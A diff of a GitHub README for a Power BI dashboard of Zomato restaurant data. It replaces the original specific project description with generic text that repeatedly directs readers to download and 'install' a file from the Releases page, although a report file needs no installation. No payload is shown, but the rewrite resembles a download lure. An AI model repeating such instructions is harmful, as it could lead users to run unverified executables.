@@ -1,106 +1,82 @@
-# 🍴 Zomato-PowerBI-Project
-Power BI project analyzing Zomato restaurant data across regions
+# 📊 Zomato-PowerBI-Project - Explore Global Restaurant Data Effortlessly
 
-## 📌 Project Overview
+[![Download Zomato-PowerBI-Project](https://img.shields.io/badge/Download%20Now-Get%20Started%20Here-brightgreen)](https://github.com/Pydev77/Zomato-PowerBI-Project/releases)
 
-This project analyzes Zomato’s global restaurant data using **Power BI**. The objective was to build an **interactive multi-page dashboard** that helps identify business performance patterns such as restaurant availability, cost, ratings, cuisines, and service offerings across different regions.
+## 🚀 Getting Started
 
-The dashboard provides actionable insights for Zomato’s stakeholders to evaluate performance at both global and regional levels.
+Welcome to the Zomato-PowerBI-Project! This project helps you analyze restaurant data from Zomato using Power BI. You will explore restaurant availability, ratings, costs, and more through an interactive dashboard. Let’s get you set up!
 
----
+## 📋 Requirements
 
-## 🎯 Objectives
+Before you start, ensure you meet the following system requirements:
 
-* Derive total restaurant count worldwide (continent, country, and city level).
-* Highlight restaurants with the highest ratings and lowest average costs.
-* Visualize cuisine diversity across regions.
-* Analyze service availability (online delivery, table booking).
-* Create an **interactive multi-page report** with filters and drill-down features.
-* Present the dashboard in line with **Zomato’s branding**.
+- **Operating System:** Windows 10 or later
+- **Memory:** At least 4 GB of RAM
+- **Processor:** 1 GHz or faster
+- **Power BI:** You need Power BI Desktop installed. You can download it from the [Microsoft website](https://powerbi.microsoft.com/en-us/downloads/).
 
----
+## 📥 Download & Install
 
-## 📂 Repository Structure
+To get the software, visit the Releases page. Here you will find the latest version available for download.
 
-```
-├── datasets/                     # Input datasets (Excel files)  
-├── Images/                       # Icon images used in the report  
-├── Zomato PowerBI Dashboard.pbix # Main Power BI project file  
-├── Zomato Project Screenshot.pdf # Screenshots of all report pages with steps  
-├── Zomato Brand Guidelines.pdf   # Branding reference for visuals  
-└── README.md                     # Project documentation  
-```
+[Download Zomato-PowerBI-Project here](https://github.com/Pydev77/Zomato-PowerBI-Project/releases)
 
----
+1. Click on the above link.
+2. Choose the most recent version.
+3. Select the file you want to download.
+4. Once downloaded, open the file and follow the installation instructions on your screen.
 
-## 📊 Dashboard Pages
+## 🔍 Features
 
-1. **Global Overview** – KPIs, world map, restaurant counts
-2. **Restaurant Ratings** – Highest/lowest ratings, distribution by region
-3. **Cost Analysis** – Average costs, expensive vs affordable restaurants
-4. **Cuisine Insights** – Cuisine variety, popularity by region
-5. **Summary Dashboard** – Consolidated KPIs and key visuals
+The Zomato-PowerBI-Project includes various features that enhance your data analysis experience:
 
----
+- **Multi-Page Dashboard:** Navigate through different pages to access diverse data views.
+- **Key Performance Indicators (KPIs):** View important metrics related to restaurant performance.
+- **Interactive Maps:** Visualize restaurant locations and their respective data.
+- **Drill-Down Capabilities:** Explore detailed insights by clicking on elements within the dashboard.
+- **Custom Branding:** Experience a professional presentation with Zomato’s branding throughout the dashboard.
 
-## 🛠️ Key Features & Techniques
+## 🌐 Usage Instructions
 
-* **Power Query**: Data cleaning, merging multiple continent files, transformations
-* **DAX**: Created calculated measures (Restaurant Count, Average Rating, Average Cost, Cuisine Count)
-* **Hierarchies**: Continent → Country → City drill-down for geographical analysis
-* **Custom Visuals**: KPI Cards, Combo Chart, Map, Donut Chart, Treemap
-* **Branding**: Colors, icons, and fonts aligned with **Zomato’s brand guidelines**
+After you install the software, you can start exploring the data:
 
----
+1. **Open Power BI Desktop.**
+2. **Load the Zomato-PowerBI Dashboard:** From the main menu, click on "File" and then "Open." Navigate to the location where you saved the downloaded file and select it.
+3. **Explore the Dashboard:** Use the navigation buttons to switch between pages. Click on any data point to see more details.
+4. **Interact with the Data:** Use the maps and KPIs to gather insights. Adjust filters and slicers to refine your data view.
 
-## 📸 Dashboard Preview  
+If you need help navigating the dashboard, please refer to the Help section in Power BI or consult the online resources available.
 
-Here are some sample pages from the dashboard:  
+## 📊 Data Sources
 
-### 📑 Home Page  
-![Home Page](Images/home_page.png)  
+This project uses public data from Zomato. It includes restaurant information such as:
 
-### 🌍 Global Overview  
-![Global Overview](Images/global_overview.png)  
+- Availability
+- Ratings
+- Costs
+- Types of cuisines
+- Available services (like online delivery and table booking)
 
-### ⭐ Restaurant Ratings  
-![Restaurant Ratings](Images/ratings_page.png)  
+## 🛠️ Contributing
 
-### 💰 Cost Analysis  
-![Cost Analysis](Images/cost_analysis.png)  
+If you want to contribute to this project, you are welcome. Here’s how you can help:
 
-### 🍽 Cuisine Insights  
-![Cuisine Insights](Images/cuisine_insights.png)  
+1. **Report Issues:** If you find bugs or suggest features, please open an issue on this repository.
+2. **Submit Improvements:** Feel free to fork the project and create a pull request with your suggestions.
+3. **Documentation:** Help improve the documentation for better clarity.
 
-For full details, see **Zomato Project Screenshot.pdf** in this repository.  
+## 📞 Support
 
+If you encounter any issues, you can reach out in the GitHub Issues section of this repository. Our community will help you as soon as possible. 
 
----
+Visit the GitHub Releases page to download the latest version again: [Visit Download Page](https://github.com/Pydev77/Zomato-PowerBI-Project/releases)
 
-## 🚀 How to Use
+## 📖 Additional Resources
 
-1. Download the repository or clone it:
+Here are some resources to help you understand Power BI better:
 
-   ```bash
-   git clone https://github.com/yourusername/Zomato-PowerBI-Project.git
-   ```
-2. Open **Zomato PowerBI Dashboard.pbix** in **Power BI Desktop**.
-3. Explore the multi-page report with interactive filters and drill-down options.
+- [Power BI Documentation](https://docs.microsoft.com/en-us/power-bi/)
+- [Power BI Community Forum](https://community.powerbi.com/)
+- [YouTube Tutorials on Power BI](https://www.youtube.com/results?search_query=power+bi+tutorials)
 
----
-
-## 📈 Learnings
-
-Through this project, I strengthened my skills in:
-
-* Power Query for advanced data transformations
-* DAX for creating measures and calculated columns
-* Designing professional, multi-page dashboards
-* Applying corporate branding to data visualizations
-* Building interactive, drillable reports for real-world business cases
-
----
-
-## 🙌 Acknowledgments
-
-This project is inspired by Zomato’s global operations and was built as part of my **Power BI learning journey**.
+Now, you’re ready to explore the rich data from Zomato with ease! Enjoy analyzing and visualizing the world of restaurants at your fingertips.
